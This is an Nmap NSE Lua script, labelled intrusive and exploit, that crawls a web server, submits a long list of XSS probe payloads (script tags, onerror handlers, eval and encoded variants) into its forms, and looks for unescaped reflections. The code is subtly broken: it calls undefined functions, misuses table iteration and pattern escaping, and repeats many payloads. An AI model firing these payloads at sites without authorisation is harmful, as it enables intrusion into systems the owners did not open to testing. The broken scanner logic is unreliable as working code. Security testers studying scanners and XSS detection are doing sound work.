description = [[
This advanced script identifies potential reflected XSS vulnerabilities by sending a list of crafted payloads to web forms and checking if they are reflected in the website's responses.
]]

---
-- @usage nmap -p80 --script advanced-xss.nse --script-args advanced-xss.formpaths={/upload.php,/login.php},advanced-xss.uploadspaths={/comments.php,/guestbook.php},advanced-xss.xss_payloads="<payload1>;<payload2>;<payload3>"
--
-- This script works in two phases:
-- 1) Posts a list of specially crafted payloads to every form it encounters.
-- 2) Crawls through the page searching for these payloads.
--
-- If any payload is reflected on some page without proper HTML escaping, it's a sign of a potential XSS vulnerability.
--
-- @args advanced-xss.formpaths The pages containing forms to exploit, e.g., {/upload.php, /login.php}.
--       Default: nil (crawler mode on)
-- @args advanced-xss.uploadspaths The pages that reflect back POSTed data, e.g., {/comments.php, /guestbook.php}.
--       Default: nil (Crawler mode on)
-- @args advanced-xss.fieldvalues Table for manually filling form fields, e.g., {gender = "male", email = "foo@bar.com"}.
--       Default: {}
-- @args advanced-xss.xss_payloads List of XSS payloads to test, separated by semicolons.
--       Default payloads will be used if not specified.

categories = {"intrusive", "exploit", "vuln"}
author = "Haroon Ahmad Awan"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

local http = require "http"
local httpspider = require "httpspider"
local shortport = require "shortport"
local stdnse = require "stdnse"

portrule = shortport.port_or_service({80, 443}, {"http", "https"}, "tcp", "open")

-- List of payloads (indicators of potential XSS vulnerability)
local xss_payloads = stdnse.get_script_args("advanced-xss.xss_payloads")
if not xss_payloads then
    -- List of XSS payloads to test
xss_payloads = {
    -- Standard payloads
'<script>alert("XSS")<\\/script>',
'<img src=x onerror=alert("XSS")>',
'<a href="javascript:alert(\'XSS\')">Click me<\\/a>',

-- Additional payloads
'<script>alert("XSS")<\\/script>',
'<img src=x onerror=alert("XSS")>',
'<a href="javascript:alert(\'XSS\')">Click me<\\/a>',
'<svg/onload=alert("XSS")>',
'<img src="javascript:alert(\'XSS\')" alt="XSS">',
'<img src=x onerror="javascript:alert(\'XSS\')">',
'\\"><script>alert("XSS")<\\/script>',
'\\"><img src=x onerror=alert("XSS")</img>',
'\\"><a href="javascript:alert(\'XSS\')">Click me<\\/a>',
'<script>alert`XSS`<\\/script>',
'<img src=x onerror=eval(`alert("XSS")`)',
'<a href="javascript:eval(`alert(\'XSS\')`);">Click me<\\/a>',
'prompt(1);',
'confirm(1);',
'<img src=x onerror=eval(atob("Y29uZmlybV8x"))>',
'<img src=x onerror=eval(\'console.log(1)\')>',
'<img src=x onerror=eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))>',
'setTimeout(function() { alert("XSS") }, 1000);',
'setTimeout(() => alert("XSS"), 1000);',
'new Function(\'alert("XSS")\')();',
'\\u003cscript\\u003ealert(1)\\u003c\\/script\\u003e',
'\\x3cimg\\x20src\\x3dx\\x20onerror\\x3dalert(1)\\x3e',
'3C7363726970743E616C6572742831585353293C2F7363726970743E',
'<svg/onload=alert("XSS")>',
'<img src="javascript:alert(\'XSS\')" alt="XSS">',
'<img src=x onerror="javascript:alert(\'XSS\')">',
'\\"><script>alert("XSS")<\\/script>',
'\\"><img src=x onerror=alert("XSS")<\\/img>',
'\\"><a href="javascript:alert(\'XSS\')">Click me<\\/a>',
'<script>alert`XSS`<\\/script>',
'<img src=x onerror=eval(`alert("XSS")`)>',
'<a href="javascript:eval(`alert(\'XSS\')`);">Click me<\\/a>',
'%3Cscript%3Ealert(%22XSS%22)%3C\\/script%3E',
'%3Cimg%20src%3Dx%20onerror%3Dalert(%22XSS%22)%3E',
'%253Cscript%253Ealert(%2522XSS%2522)%253C%2Fscript%253E',
'%253Cimg%2520src%253Dx%2520onerror%253Dalert(%2522XSS%2522)%253E',
'\\\\u003c\\\\u002fscript\\\\u003e\\\\u003cscript\\\\u003ealert(1)\\\\u003c\\\\u002fscript\\\\u003e',
'\\\\u003cimg\\\\u0020src\\\\u003dx\\\\u0020onerror\\\\u003d\\\\u0022alert(1)\\\\u0022',
'3C7363726970743E616C6572742831585353293C2F7363726970743E',
'3C696D67207372633D78206F6E6572726F723D616C6572742831585353293E',
'eval(1)',
'eval(alert(1))',
'%65%76%61%6c(%61%6c%65%72%74(1))',
'\\\\\\\\u0065\\\\\\\\u0076\\\\\\\\u0061\\\\\\\\u006c(\\\\\\\\u0061\\\\\\\\u006c\\\\\\\\u0065\\\\\\\\u0072\\\\\\\\u0074(1))'
}
else
    xss_payloads = stdnse.strsplit(";", xss_payloads)
end

-- Create customized requests for all payloads
local function makeRequests(host, port, submission, fields, fieldvalues)
    if not xss_payloads then
        stdnse.debug1("No XSS payloads defined.")
        return
    end

    for _, payload in ipairs(xss_payloads) do
        local postdata = {}
        for _, field in ipairs(fields) do
            if field.type == "text" or field.type == "textarea" or field.type == "radio" or field.type == "checkbox" then
                local value = fieldvalues[field.name] or payload
                postdata[field.name] = value
            end
        end
        stdnse.debug2("Making a POST request to " .. submission .. ": ")
        for field, content in pairs(postdata) do
            stdnse.debug2(field .. ": " .. content)
        end

        local response = http.post(host, port, submission, nil, postdata)
        if response and response.body then
            -- Continue processing the response
        else
            stdnse.debug1("Failed to retrieve response from " .. submission)
        end
    end
end

local function checkPayloads(body, payloads)
    local found = {}
    for _, payload in ipairs(payloads) do
        local decodedPayload = payload

        -- Attempt to decode base64-encoded payloads
        local decoded, decodeError = stdnse.base64_decode(payload)
        if decoded and not decodeError then
            decodedPayload = decoded
        end

        -- Handle other encodings or obfuscation techniques here
        -- For example, if you have an obfuscated payload, you can add code to deobfuscate it

        local escapedPayload = decodedPayload:gsub("[%(%)%.%%%+%-%*%?%[%^%$]]", "%%%1")
        if string.find(body, escapedPayload, 1, true) then
            table.insert(found, payload)
        end
    end
    return found
end

-- Check if payloads are reflected on the website
local function checkRequests(body, target)
    local output = {}
    for _, payload in ipairs(xss_payloads) do
        if checkPayload(body, payload) then
            local report = " Payload: " .. payload .. "\n\t Uploaded on: " .. target
            table.insert(output, report)
        end
    end
    return output
end

action = function(host, port)
 -- Check if the port is 80 (HTTP), explicitly use port 80
  local target = host.ip..":"..port.number  -- Concatenate the host IP and port number
  local response
  if port.number == 80 then
    response = http.get(host, port.number, target, { no_cache = true })
  else
    -- For all other ports (including 443), attempt an SSL connection
    response = http.get(host, port.number, target, { ssl = true, no_cache = true })
  end
  
  local formpaths = stdnse.get_script_args("advanced-xss.formpaths")
  local uploadspaths = stdnse.get_script_args("advanced-xss.uploadspaths")
  local fieldvalues = stdnse.get_script_args("advanced-xss.fieldvalues") or {}
  local dbfile = stdnse.get_script_args("advanced-xss.dbfile")

  local returntable = {}
  local result
  local index = 1 -- Declare the 'index' variable and initialize it

  if dbfile then
      readFromFile(dbfile)
  end

  -- Phase 1: Crawls through the website and POSTs malicious payloads
  local crawler = httpspider.Crawler:new(host, port, '/', { scriptname = SCRIPT_NAME, no_cache = true })
  if not crawler then
      return
  end

  crawler:set_timeout(10000)

  while true do
      if formpaths then
          local k, target = next(formpaths, index)
          if not k then
              break
          end

          -- Add error handling for HTTP request
          local response = http.get(host, port, target, { no_cache = true })
          if response then
              -- Continue processing the response
          else
              stdnse.debug1("Failed to retrieve response from " .. target)
          end
          target = host.name .. target
      else
          local status, r = crawler:crawl()
          if not status then
              if r.err then
                  return stdnse.format_output(false, r.reason)
              else
                  break
              end
          end
          target = tostring(r.url)
          response = r.response
      end

      if response.body then
          local forms = http.grab_forms(response.body)
          for _, form in ipairs(forms) do
              form = http.parse_form(form)
              if form and form.action then
                  local action_absolute = string.find(form.action, "https*://")
                  local submission
                  if action_absolute then
                      submission = form.action
                  else
                      local path_cropped = string.match(target, "(.*/).*")
                      path_cropped = path_cropped and path_cropped or ""
                      submission = path_cropped .. form.action
                  end
                  makeRequests(host, port, submission, form.fields, fieldvalues)
              end
          end
      end
      index = index + 1
  end

  -- Phase 2: Crawls through the website and searches for the specially crafted strings that were POSTed before
  local crawler = httpspider.Crawler:new(host, port, '/', { scriptname = SCRIPT_NAME })
  index = 1 -- Reset the 'index' variable

  while true do
      if uploadspaths then
          local k, target = next(uploadspaths, index)
          if not k then
              break
          end

          -- Add error handling for HTTP request
          local response = http.get(host, port, target, { no_cache = true })
          if response then
              -- Continue processing the response
          else
              stdnse.debug1("Failed to retrieve response from " .. target)
          end
      else
          local status, r = crawler:crawl()
          if not status then
              if r.err then
                  return stdnse.format_output(false, r.reason)
              else
                  break
              end
          end
          target = tostring(r.url)
          response = r.response
      end

      if response.body then
          result = checkRequests(response.body, target)
          if next(result) then
              table.insert(returntable, result)
          end
      end
      index = index + 1
  end

  if next(returntable) then
      table.insert(returntable, 1, "Found the following Reflected XSS vulnerabilities: ")
      return returntable
  else
      return "Couldn't find any reflected XSS vulnerabilities."
  end
end
